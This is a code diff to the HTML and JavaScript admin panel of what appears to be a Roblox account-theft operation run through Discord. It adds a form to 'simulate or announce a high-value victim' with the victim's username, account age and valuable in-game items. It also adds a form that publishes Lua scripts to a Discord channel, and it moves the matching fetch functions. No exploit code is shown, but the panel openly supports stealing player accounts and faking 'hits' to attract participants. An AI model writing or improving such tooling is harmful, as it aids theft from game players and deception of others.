@@ -74,59 +74,85 @@
         </section>
 
         <section id="content-discord" class="hidden">
-    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-        
-        <div class="lg:col-span-1 space-y-4">
-            <div class="panel p-4">
-                <h3 class="text-white font-black uppercase text-[9px] mb-4 text-purple-500">Fast Setup</h3>
-                <div class="flex flex-col gap-2">
-                    <button onclick="triggerSetup('rules')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
-                        <i class="fas fa-shield-halved text-purple-500"></i>
-                        <span class="font-bold uppercase text-[9px]">Send Rules</span>
-                    </button>
-                    <button onclick="triggerSetup('disclaimer')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
-                        <i class="fas fa-gavel text-slate-400"></i>
-                        <span class="font-bold uppercase text-[9px]">Send Disclaimer</span>
-                    </button>
-                    <button onclick="triggerSetup('tutorial')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
-                        <i class="fas fa-rocket text-blue-500"></i>
-                        <span class="font-bold uppercase text-[9px]">Send Tutorial</span>
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <div class="lg:col-span-2">
-            <div class="panel p-6 border-t-2 border-t-emerald-500">
-                <h3 class="text-white font-black uppercase text-xs mb-1">📢 Broadcast Manual Hit</h3>
-                <p class="text-slate-500 text-[9px] mb-6 uppercase">Simulate or announce a high-value victim</p>
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                 
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="space-y-1">
-                        <label class="text-[8px] font-black text-slate-500 uppercase">Display Name</label>
-                        <input type="text" id="hit_display" placeholder="Ex: SkibiKing" class="w-full p-2 rounded text-xs outline-none">
+                <div class="lg:col-span-1 space-y-4">
+                    <div class="panel p-4">
+                        <h3 class="text-white font-black uppercase text-[9px] mb-4 text-purple-500">Fast Setup</h3>
+                        <div class="flex flex-col gap-2">
+                            <button onclick="triggerSetup('rules')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
+                                <i class="fas fa-shield-halved text-purple-500"></i>
+                                <span class="font-bold uppercase text-[9px]">Send Rules</span>
+                            </button>
+                            <button onclick="triggerSetup('disclaimer')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
+                                <i class="fas fa-gavel text-slate-400"></i>
+                                <span class="font-bold uppercase text-[9px]">Send Disclaimer</span>
+                            </button>
+                            <button onclick="triggerSetup('tutorial')" class="setup-btn p-3 rounded flex items-center gap-3 group text-left">
+                                <i class="fas fa-rocket text-blue-500"></i>
+                                <span class="font-bold uppercase text-[9px]">Send Tutorial</span>
+                            </button>
+                        </div>
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-[8px] font-black text-slate-500 uppercase">Username</label>
-                        <input type="text" id="hit_user" placeholder="Ex: roblox_user123" class="w-full p-2 rounded text-xs outline-none">
+                </div>
+
+                <div class="lg:col-span-2 space-y-6">
+                    <div class="panel p-6 border-t-2 border-t-emerald-500">
+                        <h3 class="text-white font-black uppercase text-xs mb-1">📢 Broadcast Manual Hit</h3>
+                        <p class="text-slate-500 text-[9px] mb-6 uppercase">Simulate or announce a high-value victim</p>
+                        
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="space-y-1">
+                                <label class="text-[8px] font-black text-slate-500 uppercase">Display Name</label>
+                                <input type="text" id="hit_display" placeholder="Ex: SkibiKing" class="w-full p-2 rounded text-xs outline-none">
+                            </div>
+                            <div class="space-y-1">
+                                <label class="text-[8px] font-black text-slate-500 uppercase">Username</label>
+                                <input type="text" id="hit_user" placeholder="Ex: roblox_user123" class="w-full p-2 rounded text-xs outline-none">
+                            </div>
+                            <div class="space-y-1">
+                                <label class="text-[8px] font-black text-slate-500 uppercase">Account Age (Days)</label>
+                                <input type="number" id="hit_age" placeholder="450" class="w-full p-2 rounded text-xs outline-none">
+                            </div>
+                            <div class="col-span-2 space-y-1">
+                                <label class="text-[8px] font-black text-slate-500 uppercase">Valuable Brainrots (One per line)</label>
+                                <textarea id="hit_brainrots" rows="4" placeholder="🧠 → Titan Clockman → Secret 1.5B&#10;🧠 → Upgraded Camera → Secret 800M" class="w-full bg-[#1f2937] border border-[#374151] p-2 rounded text-xs text-emerald-400 font-mono outline-none focus:border-emerald-500"></textarea>
+                            </div>
+                            <button onclick="sendManualHit()" class="col-span-2 bg-emerald-600 hover:bg-emerald-500 text-white font-black uppercase py-3 rounded text-[10px] tracking-widest transition-all mt-2">
+                                🚀 Publish Hit to Public Channel
+                            </button>
+                        </div>
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-[8px] font-black text-slate-500 uppercase">Account Age (Days)</label>
-                        <input type="number" id="hit_age" placeholder="450" class="w-full p-2 rounded text-xs outline-none">
+
+                    <div class="panel p-6 border-t-2 border-t-amber-500">
+                        <h3 class="text-white font-black uppercase text-xs mb-1">🖼️ Publish New Visual</h3>
+                        <p class="text-slate-500 text-[9px] mb-6 uppercase">Post a new UI Script to the Visual Channel</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="space-y-4">
+                                <div class="space-y-1">
+                                    <label class="text-[8px] font-black text-slate-500 uppercase">Visual Title</label>
+                                    <input type="text" id="vis_title" placeholder="Ex: Red Dark Hub v2" class="w-full p-2 rounded text-xs outline-none">
+                                </div>
+                                <div class="space-y-1">
+                                    <label class="text-[8px] font-black text-slate-500 uppercase">Preview Image URL</label>
+                                    <input type="text" id="vis_image" placeholder="https://i.imgur.com/..." class="w-full p-2 rounded text-xs outline-none">
+                                </div>
+                            </div>
+                            
+                            <div class="space-y-1">
+                                <label class="text-[8px] font-black text-slate-500 uppercase">LUA Code or Pastefy Link</label>
+                                <textarea id="vis_lua" rows="5" placeholder="Paste your script or raw link here..." class="w-full bg-[#1f2937] border border-[#374151] p-2 rounded text-xs text-amber-400 font-mono outline-none focus:border-amber-500"></textarea>
+                            </div>
+
+                            <button onclick="sendVisualPost()" class="md:col-span-2 bg-amber-600 hover:bg-amber-500 text-white font-black uppercase py-3 rounded text-[10px] tracking-widest transition-all mt-2">
+                                📢 Post to Visual Channel
+                            </button>
+                        </div>
                     </div>
-                    <div class="col-span-2 space-y-1">
-                        <label class="text-[8px] font-black text-slate-500 uppercase">Valuable Brainrots (One per line)</label>
-                        <textarea id="hit_brainrots" rows="4" placeholder="🧠 → Titan Clockman → Secret 1.5B&#10;🧠 → Upgraded Camera → Secret 800M" class="w-full bg-[#1f2937] border border-[#374151] p-2 rounded text-xs text-emerald-400 font-mono outline-none focus:border-emerald-500"></textarea>
-                    </div>
-                    <button onclick="sendManualHit()" class="col-span-2 bg-emerald-600 hover:bg-emerald-500 text-white font-black uppercase py-3 rounded text-[10px] tracking-widest transition-all mt-2">
-                        🚀 Publish Hit to Public Channel
-                    </button>
                 </div>
             </div>
-        </div>
-
-    </div>
-</section>
+        </section>
     </div>
 
     <script>
@@ -176,6 +202,67 @@
             }
         }
 
+        async function sendManualHit() {
+            const data = {
+                displayName: document.getElementById('hit_display').value,
+                username: document.getElementById('hit_user').value,
+                age: document.getElementById('hit_age').value,
+                brainrots: document.getElementById('hit_brainrots').value
+            };
+
+            if(!data.displayName || !data.username) return alert("Veuillez remplir au moins le nom !");
+            if(!confirm("Envoyer ce hit publiquement ?")) return;
+
+            try {
+                const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: 'manual_hit', data: data })
+                });
+                const result = await res.json();
+                if(result.success) {
+                    alert("✅ Hit publié !");
+                    document.getElementById('hit_display').value = "";
+                    document.getElementById('hit_user').value = "";
+                    document.getElementById('hit_age').value = "";
+                    document.getElementById('hit_brainrots').value = "";
+                }
+            } catch (err) {
+                alert("Erreur lors de l'envoi");
+            }
+        }
+
+        async function sendVisualPost() {
+            const data = {
+                title: document.getElementById('vis_title').value,
+                image: document.getElementById('vis_image').value,
+                lua: document.getElementById('vis_lua').value
+            };
+
+            if(!data.title || !data.lua) return alert("Le titre et le code LUA sont obligatoires !");
+            if(!confirm("Publier ce visuel dans le channel #visual ?")) return;
+
+            try {
+                const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: 'publish_visual', data: data })
+                });
+                
+                const result = await res.json();
+                if(result.success) {
+                    alert("✅ Visuel publié avec succès !");
+                    document.getElementById('vis_title').value = "";
+                    document.getElementById('vis_image').value = "";
+                    document.getElementById('vis_lua').value = "";
+                } else {
+                    alert("❌ Erreur : " + result.message);
+                }
+            } catch (err) {
+                alert("❌ Erreur lors de la publication");
+            }
+        }
+
         // --- GESTION DES WEBHOOKS ---
         async function loadWebhooks() {
             const res = await fetch(`/api/admin/webhooks?token=${GLOBAL_TOKEN}`);
@@ -219,36 +306,7 @@
             await fetch(`/api/admin/webhooks/${id}?token=${GLOBAL_TOKEN}`, { method: 'DELETE' });
             loadWebhooks();
         }
-async function sendManualHit() {
-    const data = {
-        displayName: document.getElementById('hit_display').value,
-        username: document.getElementById('hit_user').value,
-        age: document.getElementById('hit_age').value,
-        brainrots: document.getElementById('hit_brainrots').value
-    };
 
-    if(!data.displayName || !data.username) return alert("Veuillez remplir au moins le nom !");
-    if(!confirm("Envoyer ce hit publiquement ?")) return;
-
-    try {
-        const res = await fetch(`/api/admin/setup-discord?token=${GLOBAL_TOKEN}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type: 'manual_hit', data: data })
-        });
-        const result = await res.json();
-        if(result.success) {
-            alert("✅ Hit publié !");
-            // Reset le formulaire
-            document.getElementById('hit_display').value = "";
-            document.getElementById('hit_user').value = "";
-            document.getElementById('hit_age').value = "";
-            document.getElementById('hit_brainrots').value = "";
-        }
-    } catch (err) {
-        alert("Erreur lors de l'envoi");
-    }
-}
         function copyScript(btn, encodedScript) {
             const script = decodeURIComponent(encodedScript);
             const icon = btn.querySelector('i');
